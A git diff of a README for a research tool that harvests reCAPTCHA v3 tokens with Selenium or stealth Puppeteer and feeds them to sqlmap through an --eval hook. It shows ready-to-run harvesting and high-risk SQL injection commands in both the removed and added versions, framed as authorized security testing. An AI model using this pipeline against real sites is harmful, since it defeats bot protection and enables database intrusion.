@@ -1,184 +1,204 @@
-## 📖 Overview
-**reCAPTCHA Token Harvester** is a proof-of-concept security research tool that demonstrates how reCAPTCHA v3 tokens can be programmatically harvested using browser automation. 
+# reCAPTCHA v3 Assisted SQLi Validation Framework
 
-This project aims to highlight that **reCAPTCHA v3 is not a security control** but rather a bot detection mechanism that can be bypassed when tokens are collected from legitimate browser environments.
+A research-driven automation workflow for testing and validating potential SQL injection behavior in web applications protected by **reCAPTCHA v3**.
 
-### 🔑 Key Research Findings
-- reCAPTCHA v3 tokens are **not bound to specific IP addresses or sessions**
-- Tokens can be **harvested in bulk** and reused across different requests
-- Server-side validation often **doesn't verify token context** (action, timestamp, etc.)
-- This enables **automated attacks** (SQL injection, credential stuffing, etc.) to bypass reCAPTCHA protection
+This project demonstrates how controlled browser automation can be used to handle dynamic client-side validation tokens during authorized security testing.
 
----
-
-## 🚀 Features
-- ✅ Harvest single or multiple reCAPTCHA v3 tokens
-- ✅ Automatic page reload for fresh tokens
-- ✅ Continuous harvesting mode
-- ✅ Headless and headful browser support
-- ✅ Anti-detection measures (stealth mode)
-- ✅ SQLMap integration via `--eval`
-- ✅ Timestamped token storage
-- ✅ Extensible to Puppeteer/Playwright
+> ⚠️ **Disclaimer:**
+> This project was developed strictly for **authorized VAPT / security research environments only**.
+> It is intended for educational and defensive security analysis purposes. Do not use against systems without explicit permission.
 
 ---
 
-## 🛠️ Installation
+## 📌 Overview
 
-### Prerequisites
-- Python 3.7+
-- Google Chrome browser
-- ChromeDriver (matching your Chrome version)
+Modern web applications often combine:
 
-### Setup
-```bash
-git clone https://github.com/YOUR_USERNAME/recaptcha-v3-token-harvester.git
-cd recaptcha-v3-token-harvester
-pip install -r requirements.txt
+* Input validation + backend database queries
+* Bot protection mechanisms (reCAPTCHA v3)
+* Session-based request validation
+
+While these controls improve security, they can also make **automated vulnerability validation challenging** during legitimate security assessments.
+
+This project explores a controlled approach to:
+
+* Handling dynamic reCAPTCHA v3 token generation
+* Maintaining valid session state during testing
+* Enabling structured automation workflows for security validation tools
+
+---
+
+## 🧠 Problem Statement
+
+During security testing, certain endpoints:
+
+* Returned **database-level errors on unexpected input**
+* Required **valid reCAPTCHA v3 tokens per request**
+* Blocked traditional automation tools (e.g., sqlmap) due to dynamic validation
+
+This created a gap between:
+
+> Manual testing (signal detected) vs Automated validation (blocked by bot protection)
+
+---
+
+## ⚙️ Solution Approach
+
+This framework implements a **browser-driven token acquisition pipeline** that:
+
+1. Launches a real Chrome session via Selenium
+2. Loads the target application page
+3. Executes reCAPTCHA v3 client-side flow
+4. Extracts valid tokens dynamically
+5. Feeds tokens into external testing tools (e.g., sqlmap)
+6. Maintains session consistency across requests
+
+---
+
+## 🧩 Architecture Flow
+
 ```
-
-### Requirements (`requirements.txt`)
-```txt
-selenium>=4.15.0
+Browser Automation (Selenium)
+        ↓
+reCAPTCHA v3 Execution
+        ↓
+Token Extraction Layer
+        ↓
+Temporary Token Storage
+        ↓
+sqlmap / Testing Tool Injection Layer
+        ↓
+Target Application Validation
 ```
 
 ---
 
-## 📝 Usage
+## 📁 Repository Structure
 
-### Basic Usage
-```bash
-# Single token
-python3 harvest.py --url "https://target.com/register" --site-key "6Lc...your_key"
-
-# Multiple tokens
-python3 harvest.py --url "https://target.com/register" --site-key "6Lc...your_key" --count 5 --delay 5
-
-# Headless mode
-python3 harvest.py --url "https://target.com/register" --site-key "6Lc...your_key" --headless
 ```
-
-### Command-Line Arguments
-
-| Argument     | Description                                      | Default                        |
-|--------------|--------------------------------------------------|--------------------------------|
-| `--url`      | Target URL containing reCAPTCHA v3               | `https://example.com/register` |
-| `--site-key` | reCAPTCHA v3 site key                            | Google test key                |
-| `--count`    | Number of tokens to harvest                      | `1`                            |
-| `--delay`    | Delay between harvests (seconds)                 | `3`                            |
-| `--headless` | Run Chrome in headless mode                      | `False`                        |
-| `--output`   | Output file for tokens                           | `tokens.txt`                   |
+.
+├── recaptcha_harvester.py     # Token generation automation script
+├── sqlmap_command.txt         # Example sqlmap integration command
+├── requirements.txt
+└── README.md
+```
 
 ---
 
-## 🔗 SQLMap Integration
+## 🚀 Key Features
 
-### Step 1: Harvest Token
+* Automated reCAPTCHA v3 token generation
+* Session-aware browser automation
+* Continuous / batch token harvesting modes
+* Integration-ready with sqlmap workflows
+* File-based token exchange mechanism
+* Stable execution under dynamic JS environments
+
+---
+
+## 🧪 Usage Workflow
+
+### 1. Start Token Harvester
+
 ```bash
-python3 harvest.py --url "http://target.com/register" \
-  --site-key "6LdZ...site_key" \
-  --output /tmp/current_recaptcha_token.txt &
+python recaptcha_harvester.py
 ```
 
-### Step 2: Run SQLMap
+Select mode:
+
+* Single token generation
+* Batch token collection
+* Continuous token streaming
+
+---
+
+### 2. Run SQLMap with Token Injection
+
+Example integration (sanitized):
+
 ```bash
-sqlmap -u "http://target.com/register" \
-  --data="username=admin&password=test&recaptcha_response=PLACEHOLDER&submit=" \
-  --cookie="PHPSESSID=dummy123" \
-  --eval="import os,time
-def wait_for_token():
-    t = 0
+python sqlmap.py \
+-u "https://example.com/register" \
+--data="username=test&mobile=1*&recaptcha_response=PLACEHOLDER" \
+--cookie="SESSION_ID_PLACEHOLDER" \
+--eval="
+import os,time
+
+def wait_token():
+    t=0
     while not os.path.exists('/tmp/current_recaptcha_token.txt'):
         time.sleep(0.2)
-        t += 0.2
-        if t > 60: break
-wait_for_token()
+        t+=0.2
+        if t>60:
+            break
+
+wait_token()
+
 if os.path.exists('/tmp/current_recaptcha_token.txt'):
     with open('/tmp/current_recaptcha_token.txt') as f:
-        recaptcha_response = f.read().strip()
-    os.remove('/tmp/current_recaptcha_token.txt')" \
-  --batch --dbms=mysql --technique=E --level=5 --risk=3 --current-db --threads=1 -v 4
-```
-
-> **💡 Tip**: Tokens are valid for ~2 minutes. Run SQLMap immediately after harvesting.
-
----
-
-## 🎭 Puppeteer Integration (Concept)
-```javascript
-// harvest.js
-const puppeteer = require('puppeteer-extra');
-const StealthPlugin = require('puppeteer-extra-plugin-stealth');
-puppeteer.use(StealthPlugin());
-
-(async () => {
-  const browser = await puppeteer.launch({ headless: false });
-  const page = await browser.newPage();
-  await page.goto('https://target.com/register');
- 
-  const token = await page.evaluate((siteKey) => {
-    return new Promise((resolve) => {
-      grecaptcha.ready(() => {
-        grecaptcha.execute(siteKey, { action: 'submit' }).then(token => resolve(token));
-      });
-    });
-  }, '6Lc...site_key');
- 
-  console.log('Token:', token);
-  await browser.close();
-})();
+        recaptcha_response=f.read().strip()
+    os.remove('/tmp/current_recaptcha_token.txt')
+"
 ```
 
 ---
 
-## 🔬 Technical Details
+## 🔬 Results
 
-### How It Works
-1. Browser spoofing and stealth techniques
-2. Executes `grecaptcha.execute()` in real browser context
-3. Extracts fresh tokens before expiration
-4. Enables token replay in automated tools
+* Identified potential SQL injection indicators in input handling
+* Successfully validated automated request flow under reCAPTCHA v3 constraints
+* Confirmed that bot protection alone does not eliminate backend logic flaws
 
-### Why This Matters
-reCAPTCHA v3 uses a score-based system (0.0–1.0), but many implementations fail to properly validate score, action, or timestamp on the server side.
+However:
 
----
-
-## ⚠️ Legal & Ethical Guidelines
-- Use **only** on systems you own or have explicit written authorization to test
-- Follow responsible disclosure practices
-- Comply with all local laws
-- Do not use for malicious or unauthorized activities
+> The issue was later determined to be **non-exploitable under real-world constraints**, but still valuable from a security analysis perspective.
 
 ---
 
-## 📊 Research Impact
-- Demonstrates limitations of reCAPTCHA v3
-- Highlights the need for strong server-side validation
-- Shows token harvesting is trivial with modern browser automation
+## 🛠️ Future Improvements
 
----
+### 🔹 Puppeteer-based Migration (Recommended)
 
-## 🤝 Contributing
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/new-feature`)
-3. Commit your changes
-4. Push to the branch and open a Pull Request
+A more robust version of this framework can be implemented using **Puppeteer** instead of Selenium.
 
----
+Advantages:
 
-## 📄 License
-This project is licensed under the **MIT License**.
+* Better control over Chrome DevTools Protocol (CDP)
+* Improved stability for modern JavaScript-heavy applications
+* More reliable async event handling
+* Easier request interception and modification
+* Reduced flakiness in token generation flows
 
----
+### 🔹 Suggested Architecture Upgrade
 
-## 👤 Author
-**Your Name**  
-GitHub: [@your_username](https://github.com/your_username)
-
----
-
-**Remember**: With great power comes great responsibility. Use this knowledge to improve security, not compromise it. 🔒
+```
+Puppeteer Automation Layer
+        ↓
+Token Management API (Node.js)
+        ↓
+External Testing Tools (sqlmap / custom scripts)
 ```
 
-Just copy everything above and paste it into your `README.md`. Let me know if you want any changes!
+This modular approach improves:
+
+* Scalability
+* Reliability
+* Maintainability
+
+---
+
+## 📚 Key Learnings
+
+* reCAPTCHA v3 is a **risk signal system**, not a security boundary
+* Backend validation flaws can still exist behind strong front-end protections
+* Automation in VAPT requires **workflow engineering**, not just tools
+* Exploitability must always be separated from detection
+
+---
+
+## 🔗 Related Work
+
+* Medium Writeup: *(add your article link here)*
+* Author: Security Researcher (VAPT / Application Security)
+
+---
